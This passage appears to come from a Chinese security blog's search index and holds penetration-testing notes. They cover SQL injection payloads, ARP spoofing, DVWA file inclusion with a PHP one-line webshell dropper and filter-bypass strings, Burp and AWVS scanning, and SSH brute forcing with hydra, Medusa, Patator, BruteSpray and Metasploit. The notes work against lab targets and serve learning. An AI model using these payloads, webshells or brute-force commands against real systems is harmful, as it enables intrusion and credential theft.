extractvalue(1,concat('^',(查询内容)，'^'))]</span><br></pre></td></tr></table></figure><p>提交参数：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[?id=1' and extractvalue(1,concat('^',(<span class="keyword">select</span> varsion())，<span class="string">'^'</span>)) <span class="comment">--+]</span></span><br></pre></td></tr></table></figure><h2 id="updatexml（）函数"><a href="#updatexml（）函数" class="headerlink" title="updatexml（）函数"></a>updatexml（）函数</h2><p>公式：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[?id=1 and updatexml(1,concat('^',(查询的内容),'^'),1)]</span><br></pre></td></tr></table></figure><p>提交参数：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[?id=1’ and updatexml(1,concat('^',(<span class="keyword">select</span> <span class="keyword">database</span>()),<span class="string">'^'</span>),<span class="number">1</span>) <span class="comment">--+]</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 - 注入漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>arp中间人攻击</title>
      <link href="/2020/04/27/arp%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/"/>
      <url>/2020/04/27/arp%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<h1 id="arp中间人攻击"><a href="#arp中间人攻击" class="headerlink" title="arp中间人攻击"></a>arp中间人攻击</h1><h2 id="arp攻击"><a href="#arp攻击" class="headerlink" title="arp攻击"></a>arp攻击</h2><p>工具：arpspoof</p><p>目标ip：192.168.3.137</p><p>网关：192.168.3.1</p><p>kali ip：192.168.19.137</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arpspoof -i 网卡 -t 目标IP 网关</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arpspoof -i eth0 -t 192.168.3.137 192.168.3.1</span><br></pre></td></tr></table></figure><h2 id="arp欺骗"><a href="#arp欺骗" class="headerlink" title="arp欺骗"></a>arp欺骗</h2><p>工具：driftnet</p><p>第一步：开启端口转发功能</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo 1 &gt;&#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;ip_forward</span><br></pre></td></tr></table></figure><p>检查是否开启（开启返回1）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;ip_forward</span><br></pre></td></tr></table></figure><p>第二步：arp欺骗</p><p>第三歩：dirftnet</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirftnet -i eth0</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 - arp中间人攻击 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件包含漏洞</title>
      <link href="/2020/04/27/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"/>
      <url>/2020/04/27/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h1><p>文件包含漏洞：</p><p>File Inclusion，意思是文件包含(漏洞)，是指当服务器开启<strong>allow_url_include</strong>选项时，就可通过php的某些特性函数（<strong>include()</strong>，<strong>require()</strong>和<strong>include_once()</strong>，<strong>require_once()</strong>）利用url去动态包含文件，此时如果没有对文件来源进行严格审查，就会导致任意文件读取或者任意命令执行。</p><p>文件包含漏洞分为<strong>本地文件包含漏洞</strong> 和 <strong>远程文件包含漏洞</strong>。</p><p>远程文件包含漏洞：因为开启php配置中的<strong>allow_url_fopen</strong>选项（选项开启之后，服务器允许包含一个远程的文件）。服务器通过php的特性（函数）去包含任意文件时，由于要包含的这个文件来源过滤不严格，从而可以去包含一个恶意文件，而我们可以构造这个恶意文件来达到自己的目的。</p><ol><li><p>文件包含（File Inclusion）即程序通过[包含函数]调用本地或远程文件，以此来实现拓展功能</p></li><li><p>被包含的文件可以是以各种文件格式，而当文件里面包含恶意代码，则会形成远程命令执行或文件上传漏洞</p></li><li><p>文件包含漏洞主要发生在有包含语句的环境中，例如PHP所具备include、require等包含函数</p></li></ol><p><strong>文件包含分为两类：</strong></p><p>本地文件包含（Local File Inclusion）当被包含文件在服务器本地时，就形成本地文件包含</p><p>远程文件包含（Remote File inclusion）当被包含的文件在第三方服务器时，叫做远程文件包含</p><h2 id="低级安全渗透"><a href="#低级安全渗透" class="headerlink" title="低级安全渗透"></a>低级安全渗透</h2><h3 id="本地文件包含-webshell"><a href="#本地文件包含-webshell" class="headerlink" title="本地文件包含+webshell"></a>本地文件包含+webshell</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> 制作一句话图片木马 <span class="number">666.</span>jpg</span><br><span class="line"><span class="meta">&lt;?php</span> fputs(fopen(<span class="string">"shell3.php"</span>,<span class="string">"w"</span>),<span class="string">'&lt;?php @eval($_POST[666]);?&gt;'</span>)<span class="meta">?&gt;</span></span><br><span class="line"><span class="number">2.</span> 上传图片木马文件</span><br><span class="line"><span class="number">3.</span>执行文件包含并生成后门</span><br><span class="line"><span class="number">4.</span>通过蚁剑连接webshell</span><br><span class="line">    </span><br><span class="line">提示：</span><br><span class="line">../../www/DVWA/hackable/uploads<span class="comment">//DVWA文件上传访问的目录 666.jpg</span></span><br><span class="line">../../www/DVWA/vulnerabilities/fi<span class="comment">//DVWA文件包含访问的目录 shell3.php</span></span><br></pre></td></tr></table></figure><p>图片制作：</p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/1581152252234.png"  alt="1581152252234"></p><h3 id="远程文件包含-webshell"><a href="#远程文件包含-webshell" class="headerlink" title="远程文件包含+webshell"></a>远程文件包含+webshell</h3><p>建立远程服务器，本项目使用kali作为远程服务器</p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/1581154911072.png"  alt="1581154911072"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# service apache2 start</span><br><span class="line">root@kali:~# vim var&#x2F;www&#x2F;html&#x2F;shell.text</span><br><span class="line">    &lt;?php fputs(fopen(&quot;shell4.php&quot;,&quot;w&quot;),&#39;&lt;?php @eval($_POST[666]);?&gt;&#39;)?&gt;</span><br></pre></td></tr></table></figure><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/1581155381341.png"  alt="1581155381341"></p><p>把远程服务器的路径复制到网页执行</p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/1581157223416.png"  alt="1581157223416"></p><p>打开蚁剑添加数据</p><p><strong>注意：路径是文件包含的路径+执行一句话木马生成的文件名</strong></p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/1581157508777.png"  alt="1581157508777"></p><h2 id="中级安全渗透"><a href="#中级安全渗透" class="headerlink" title="中级安全渗透"></a>中级安全渗透</h2><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/1581157757837.png"  alt="1581157757837"></p><p>由于代码对http://、https://和../ 、..\进行了替换成空“”，对于本地文件包漏洞含依旧可以执行，而远程文件包含漏洞进行了限制。</p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/1581158408627.png"  alt="1581158408627"></p><p>对于远程文件包含可以通过双重复写进行处理</p><p>http://        可写成     ht<a href="http://tp://" target="_blank" rel="noopener">http://tp://</a></p><p>https://        可写成     ht<a href="https://tps://" target="_blank" rel="noopener">https://tps://</a></p><p>../        可写成         …/./</p><p>..\        可写成        …\.\</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 - 文件包含漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>漏洞扫描</title>
      <link href="/2020/04/26/Web%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%20Burp%20suite%E5%92%8CAWVS/"/>
      <url>/2020/04/26/Web%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%20Burp%20suite%E5%92%8CAWVS/</url>
      
        <content type="html"><![CDATA[<h1 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h1><h2 id="Web漏洞扫描-Burp-suite"><a href="#Web漏洞扫描-Burp-suite" class="headerlink" title="Web漏洞扫描 Burp suite"></a>Web漏洞扫描 Burp suite</h2><p>安全渗透使用最广泛的漏洞扫描工具之一，能实现从漏洞发现到利用的完整工程。功能强大、配置较为复杂、可定制型强，支持丰富的第三方拓展插件。基于Java编写，跨平台支持，分为Free和Professional版本</p><p><a href="http://protswigger.net/burp/" target="_blank" rel="noopener">http://protswigger.net/burp/</a></p><h3 id="功能介绍"><a href="#功能介绍" class="headerlink" title="功能介绍"></a>功能介绍</h3><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/1581664404190.png"  alt="1581664404190"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Target目标模块用于设置扫描域（target scope）、生成站点地图（sitemap）生成安全分析</span><br><span class="line">Proxy代理模块用于拦截游览器的http会话内容</span><br><span class="line">Spider扫描模块用于自动化检测漏洞，分为主动和被动扫描</span><br><span class="line">Intruder入侵（渗透）模块根据上面检测到的可能存在漏洞链接，调用攻击载荷，对目标链接进行攻击</span><br><span class="line">入侵模块的原理是根据访问链接中存在的参数&#x2F;变量，调用本地词典、攻击载荷，对参数进行渗透测试</span><br><span class="line">Repeater重放模块用于实现请求重放，通过修改参数进行手工请求回应的调试</span><br><span class="line">Sequencer序列器模块用于检测参数的随机性，例如密码或者令牌是否可预测，以此判断关键数据是否可被伪造</span><br><span class="line">Decoder解码器模块用于实现对URL、HTML、Base64、ASCII、二&#x2F;八&#x2F;十六进制、哈希等编码转换</span><br><span class="line">Comparer对比模块用于对两次不同的请求和回应进行可视化对比，以此区分不同参数对结果造成的影响</span><br><span class="line">Extender拓展模块是burpsuite非常强悍的一个功能，也是它跟其他web安全评估系统最大的差别</span><br><span class="line">通过拓展模块，可以加载自己开发的、或者第三方模块、打造自己的burpsuite功能</span><br><span class="line">通过burpsuite提供的API接口，目前可以支持Java&#x2F;Python&#x2F;Ruby三种语言的模块编写</span><br><span class="line">Option分为project&#x2F;User Options，主要对软件进行全局设置</span><br><span class="line">Alerts显示软件的使用日志信息</span><br></pre></td></tr></table></figure><h3 id="项目试验环境"><a href="#项目试验环境" class="headerlink" title="项目试验环境"></a>项目试验环境</h3><p>目标靶机：OWASP_Broken_Web_Apps_VM_1.2</p><p>测试渗透机：win7/kali</p><h3 id="Burp-Suite安装"><a href="#Burp-Suite安装" class="headerlink" title="Burp Suite安装"></a>Burp Suite安装</h3><p>Kali Linux：集成Burp Suite Free版本，不支持scanner功能</p><p>Windows： Burp Suite Pro 1.7.30版本，支持全部功能</p><p>启动方法：</p><p><code>java -jar -Xmx1024M /burpsuite_path/BurpHelper.jar</code></p><p>Burp Suite带有非常详细的帮助文档</p><h3 id="Burp-Suite使用"><a href="#Burp-Suite使用" class="headerlink" title="Burp Suite使用"></a>Burp Suite使用</h3><h4 id="代理功能Proxy"><a href="#代理功能Proxy" class="headerlink" title="代理功能Proxy"></a>代理功能Proxy</h4><p>开启监听端口</p><p>游览器设置代理</p><p>代理功能详解</p><p>拦截账号信息</p><h4 id="目标功能Target"><a href="#目标功能Target" class="headerlink" title="目标功能Target"></a>目标功能Target</h4><p>设置目标域</p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/1581667068222.png"  alt="1581667068222"></p><h4 id="爬虫功能Spider"><a href="#爬虫功能Spider" class="headerlink" title="爬虫功能Spider"></a>爬虫功能Spider</h4><p>准备工作</p><p>设置代理获取域名</p><p>访问目标网站</p><p>设置目标域</p><p>拦截功能关闭</p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/1581669152597.png"  alt="1581669152597"></p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/1581669113987.png"  alt="1581669113987"></p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/1581669186181.png"  alt="1581669186181"></p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/1581669244058.png"  alt="1581669244058"></p><h4 id="扫描功能Scanner"><a href="#扫描功能Scanner" class="headerlink" title="扫描功能Scanner"></a>扫描功能Scanner</h4><p>准备工作</p><p>设置代理获取域名</p><p>访问目标网站</p><p>设置目标域</p><p>拦截功能关闭</p><p>扫描方式：</p><p>主动扫描精准度高时间长影响大消耗资源大</p><p>被动扫描精准度低时间段影响小消耗资源小</p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/1581670070610.png"  alt="1581670070610"></p><p>攻击插入点</p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/1581670129251.png"  alt="1581670129251"></p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/1581670150890.png"  alt="1581670150890"></p><p>主动扫描</p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/1581670196277.png"  alt="1581670196277"></p><h2 id="Web漏洞扫描-AWVS"><a href="#Web漏洞扫描-AWVS" class="headerlink" title="Web漏洞扫描-AWVS"></a>Web漏洞扫描-AWVS</h2><p>Acunetix Web Vulenrability Scanner（简称AWVS）是一款知名的Web网络漏洞扫描工具，它通过网络爬虫测试你的网站安全，检测流行安全漏洞。</p><p>它包含有收费和免费两个版本，AWVS官方网站是：<a href="http://www.acunetix.com/，官方下载地址：http://www.acunetix.com/vulnerability-scanner/download/，官方免费下试用14天。" target="_blank" rel="noopener">http://www.acunetix.com/，官方下载地址：http://www.acunetix.com/vulnerability-scanner/download/，官方免费下试用14天。</a></p><h3 id="功能特点"><a href="#功能特点" class="headerlink" title="功能特点"></a>功能特点</h3><ol><li>自动的客户端脚本分析器，允许对 Ajax 和 Web2.0 应用程序进行安全测试</li><li>业内最先进且深入的 SQL 注入和跨脚本测试</li><li>高级渗透测试工具，例如 HTTP Editor 和 HTTP Fuzzer</li><li>可视化宏记录器帮助您轻松测试 web 表格和受密码保护的区域</li><li>支持含有 CAPTHCA 的页面，单个开始指令和 Two Factor （双因素）验证机制</li><li>丰富的报告功能，包含 VISA PCI 依从性报告</li><li>高速的多线程扫描器轻松检索成千上万个页面</li><li>智能爬行程序检测 web 服务器类型和应用程序语言</li><li>Acunetix 检索并分析网站，包括 flash 内容、SOAP 和 AJAX</li><li>端口扫描 web 服务器并对在服务器上运行的网络服务执行安全检查</li><li>可导出网站漏洞文件</li></ol>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 - 漏洞扫描 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSH密码暴力破解</title>
      <link href="/2020/04/26/SSH%E5%AF%86%E7%A0%81%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/"/>
      <url>/2020/04/26/SSH%E5%AF%86%E7%A0%81%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="SSH密码暴力破解"><a href="#SSH密码暴力破解" class="headerlink" title="SSH密码暴力破解"></a>SSH密码暴力破解</h1><h2 id="hydra【海德拉】"><a href="#hydra【海德拉】" class="headerlink" title="hydra【海德拉】"></a>hydra【海德拉】</h2><p>hydra 是世界顶级密码暴力破解工具，支持几乎所有协议的在线密码破解，功能强大，其密码能否被破解取决于破解字典是否足够强大，在网络安全渗透过程中是一款必备的测试工具。</p><h3 id="指定用户破解"><a href="#指定用户破解" class="headerlink" title="指定用户破解"></a>指定用户破解</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Examples:</span><br><span class="line">hydra -l user -P passlist.txt ftp:<span class="comment">//192.168.0.1</span></span><br><span class="line">hydra -L userlist -p defaultpw imap:<span class="comment">//192.168.0.1/PLAIN</span></span><br><span class="line">hydra -C defaults.txt <span class="number">-6</span> pop3s:<span class="comment">//[2001:db8::1]:143/TLS:DIGEST-MDS</span></span><br><span class="line">hydra -l admin -p password ftp:<span class="comment">//[192.168.0.0/24]/</span></span><br><span class="line">hydra -L logins.txt -P pws.txt -M targets.txt ssh</span><br><span class="line">    </span><br><span class="line">root@kali:~<span class="comment"># hydra -l root -P pass.dic 192.168.106.134 ssh</span></span><br><span class="line">root@kali:~<span class="comment"># hydra -L userlist.txt -P passlist.txt -M hosts.txt ssh -o ssh-hydra.ok</span></span><br><span class="line">    </span><br><span class="line">-l用户<span class="keyword">or</span>用户字典</span><br><span class="line">-p密码<span class="keyword">or</span>密码字典</span><br><span class="line">-M主机列表</span><br><span class="line">-o把破解的账号密码输出到文件了</span><br></pre></td></tr></table></figure><h2 id="Medusa【美杜莎】"><a href="#Medusa【美杜莎】" class="headerlink" title="Medusa【美杜莎】"></a>Medusa【美杜莎】</h2><p>Medusa（美杜莎）是一个速度快，支持大规模并行，模块化，爆破登陆。可以同时对多个主机，用户或密码执行强力测试。Medusa 和 hydra 一样，同样属于在线密码破解工具。不同的是，Medusa 的稳定性相比较 hydra 要好很多，但其他支持模块要比 hydra 少一些。 </p><h3 id="语法参数"><a href="#语法参数" class="headerlink" title="语法参数"></a>语法参数</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">Medusa [-h host | -H file] [-u username | -U file] [-p password | -P file] [-C file] -M module [OPT]</span><br><span class="line">    </span><br><span class="line">-h [TEXT]主机名称或者IP地址</span><br><span class="line">-H [FILE]包含目标主机名称或者IP地址文件</span><br><span class="line">-u [TEXT]测试的用户名</span><br><span class="line">-U [FILE]包含测试的用户名文件</span><br><span class="line">-p [TEXT]测试的密码</span><br><span class="line">-P [FILE]包含测试的密码文件</span><br><span class="line">-C [FILE]组合条目文件</span><br><span class="line">-O [FILE]日志信息文件</span><br><span class="line">-e [n/s/ns]n代表空密码，s代表为密码与用户名相同</span><br><span class="line">-M [TEXT]模块执行名称</span><br><span class="line">-m [TEXT]传递参数到模块</span><br><span class="line">-d显示所有的模块名称</span><br><span class="line">-n [NUM]使用非默认Tcp端口</span><br><span class="line">-s 启用SSL</span><br><span class="line">-r [NUM]重试间隔时间，默认为<span class="number">3</span>秒</span><br><span class="line">-t [NUM]设定线程数量</span><br><span class="line">-T 同时测试的主机总数</span><br><span class="line">-L并行化，每个用户使用一个线程</span><br><span class="line">-f在任何主机上找到第一个账号/密码后，停止破解</span><br><span class="line">-F在任何主机上找到第一个有效的用户名/密码后停止审计</span><br><span class="line">-q显示模块的使用信息</span><br><span class="line">-v [NUM]详细级别（<span class="number">0</span><span class="number">-6</span>）</span><br><span class="line">-w [NUM]错误条数级别（<span class="number">0</span><span class="number">-10</span>）</span><br><span class="line">-V显示版本</span><br><span class="line">-Z [TEXT]继续扫描上一次</span><br></pre></td></tr></table></figure><h3 id="破解SSH密码"><a href="#破解SSH密码" class="headerlink" title="破解SSH密码"></a>破解SSH密码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># Medusa -M ssh -h 192.168.106.134 -u root -P passlist.txt</span></span><br></pre></td></tr></table></figure><h2 id="Patator"><a href="#Patator" class="headerlink" title="Patator"></a>Patator</h2><p>Patator，强大的命令行玻璃破解器</p><h3 id="可用模块"><a href="#可用模块" class="headerlink" title="可用模块"></a>可用模块</h3><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/1581750910378.png"  alt="1581750910378"></p><h3 id="破解SSH密码-1"><a href="#破解SSH密码-1" class="headerlink" title="破解SSH密码"></a>破解SSH密码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># patator ssh_login --help</span></span><br><span class="line">Patator v0<span class="number">.7</span> (https:<span class="comment">//github.com/lanjelot/patator)</span></span><br><span class="line">Usage: patator module --help</span><br><span class="line"></span><br><span class="line">Examples:</span><br><span class="line">  ssh_login host=<span class="number">10.0</span><span class="number">.0</span><span class="number">.1</span> user=root password=FILE0 <span class="number">0</span>=passwords.txt -x ignore:mesg=<span class="string">'Authentication failed.'</span></span><br><span class="line"></span><br><span class="line">root@kali:~<span class="comment"># patator ssh_login host=192.1168.106.134 user=root password=FILE0 0=passlist.txt</span></span><br><span class="line">root@kali:~<span class="comment"># patator ssh_login host=192.1168.106.134 user=root password=FILE0 0=passlist.txt \ -x ignore:mesg='Authentication failed.'  #忽略错误的</span></span><br></pre></td></tr></table></figure><h2 id="BruteSpray"><a href="#BruteSpray" class="headerlink" title="BruteSpray"></a>BruteSpray</h2><p>BruteSpray 是一款基于nmap扫描输出的gnamp/XML文件。自动调用Medusa对服务进行暴力破解（Medusa美杜莎 是一款端口爆破工具，速度比较Hydra九头蛇 快）。</p><h3 id="kali端安装"><a href="#kali端安装" class="headerlink" title="kali端安装"></a>kali端安装</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># apt-get updata</span></span><br><span class="line">root@kali:~<span class="comment"># apt-get install brutespray</span></span><br></pre></td></tr></table></figure><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/1581752093932.png"  alt="1581752093932"></p><h3 id="语法参数-1"><a href="#语法参数-1" class="headerlink" title="语法参数"></a>语法参数</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">-f FILE，--file FILE参数后跟一个文件名，解析nmap输出的GNMAP或者XML文件</span><br><span class="line">-o OUTPUT，--output OUTPUT包含成功尝试目录</span><br><span class="line">-s SERVICE，--service SERVICE参数后跟一个服务名，指定要攻击的服务</span><br><span class="line">-t THREADS，--threads THREADS参数后跟一个数值，指定Medusa线程数</span><br><span class="line">-T HOSTS，--hosts HOSTS参数后跟一数值，指定同时测试的主机数</span><br><span class="line">-U USERLIST，--userlist USerLIST参数后跟用户字典文件</span><br><span class="line">-P PASSLIST，--passlist PASSLIST 参数后跟密码字典文件</span><br><span class="line">-u USERNAME，username USERNAME参数后跟用户名，指定一个用户名进行爆破</span><br><span class="line">-p PASSWORD，password PASSWORD参数后跟密码，指定一个密码进行爆破</span><br><span class="line">-c，--continuous成功之后继续爆破</span><br><span class="line">-i，--interactive交互模式</span><br></pre></td></tr></table></figure><h3 id="nmap-扫描"><a href="#nmap-扫描" class="headerlink" title="nmap 扫描"></a>nmap 扫描</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -v 192.168.106.0/24 -oX nmap.xml#-oX输出文集是xml格式</span></span><br><span class="line">root@kali:~<span class="comment"># nmap -A -p22 -v 192.168.106.0/24 -oX 22.xml#-p22，扫描22端口。-A版本扫描</span></span><br><span class="line">root@kali:~<span class="comment"># nmap -sP 192.168.106.0/24 -oX nmaplive.xml#sP是进行ping扫描</span></span><br><span class="line">root@kali:~<span class="comment"># nmap -sV -O 192.168.106.0/24 -oX nmap.xml#-O系统扫描。-sV探测端口服务版本</span></span><br></pre></td></tr></table></figure><h3 id="字典爆破-SSH"><a href="#字典爆破-SSH" class="headerlink" title="字典爆破 SSH"></a>字典爆破 SSH</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment">#  brutespray --file 22.xml -U userlist.txt -P passlist.txt --threads 5 --hosts 5</span></span><br></pre></td></tr></table></figure><p>查看文件是否爆破成功</p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/1581754693055.png"  alt="1581754693055"></p><h2 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h2><p>Metasploit Framework（简称MSF）是一个编写、测试和使用exploit代码的完善环境。这个环境Wie渗透测试，Shellcode编写和漏洞研究提供一个可靠的平台，这个框架只要是由面向对象的Perl编写语言编写的，并带有由C语言，汇编程序和Python编写的可选组件。</p><h3 id="SSH模块"><a href="#SSH模块" class="headerlink" title="SSH模块"></a>SSH模块</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali~<span class="comment"># msfconsole</span></span><br><span class="line">msf &gt; search ssh</span><br></pre></td></tr></table></figure><h3 id="SSH用户枚举"><a href="#SSH用户枚举" class="headerlink" title="SSH用户枚举"></a>SSH用户枚举</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; <span class="keyword">use</span> <span class="title">auxiliary</span>/<span class="title">scanner</span>/<span class="title">ssh</span>/<span class="title">ssh_enumusers</span>#<span class="title">ssh_enumusers</span>枚举用户的模块</span><br><span class="line"><span class="title">msf</span> <span class="title">auxiliary</span>(<span class="title">scanner</span>/<span class="title">ssh</span>/<span class="title">ssh_enumusers</span>) &gt; <span class="title">set</span> <span class="title">rhosts</span> 192.168.106.134#主机</span><br><span class="line"><span class="title">msf</span> <span class="title">auxiliary</span>(<span class="title">scanner</span>/<span class="title">ssh</span>/<span class="title">ssh_enumusers</span>) &gt; <span class="title">set</span> <span class="title">USER_FILE</span> /<span class="title">root</span>/<span class="title">userlist</span>.<span class="title">txt</span>#用户</span><br><span class="line"><span class="title">msf</span> <span class="title">auxiliary</span>(<span class="title">scanner</span>/<span class="title">ssh</span>/<span class="title">ssh_enumusers</span>) &gt; <span class="title">run</span></span><br></pre></td></tr></table></figure><h3 id="SSH版本探测"><a href="#SSH版本探测" class="headerlink" title="SSH版本探测"></a>SSH版本探测</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; <span class="keyword">use</span> <span class="title">auxiliary</span>/<span class="title">scanner</span>/<span class="title">ssh</span>/<span class="title">ssh_version</span>#<span class="title">ssh_version</span>版本探测模块</span><br><span class="line"><span class="title">msf</span> <span class="title">auxiliary</span>(<span class="title">scanner</span>/<span class="title">ssh</span>/<span class="title">ssh_version</span>) &gt; <span class="title">set</span> <span class="title">rhosts</span> 192.168.106.134</span><br><span class="line"><span class="title">msf</span> <span class="title">auxiliary</span>(<span class="title">scanner</span>/<span class="title">ssh</span>/<span class="title">ssh_version</span>) &gt; <span class="title">run</span></span><br></pre></td></tr></table></figure><h3 id="SSH暴力破解"><a href="#SSH暴力破解" class="headerlink" title="SSH暴力破解"></a>SSH暴力破解</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; <span class="keyword">use</span> <span 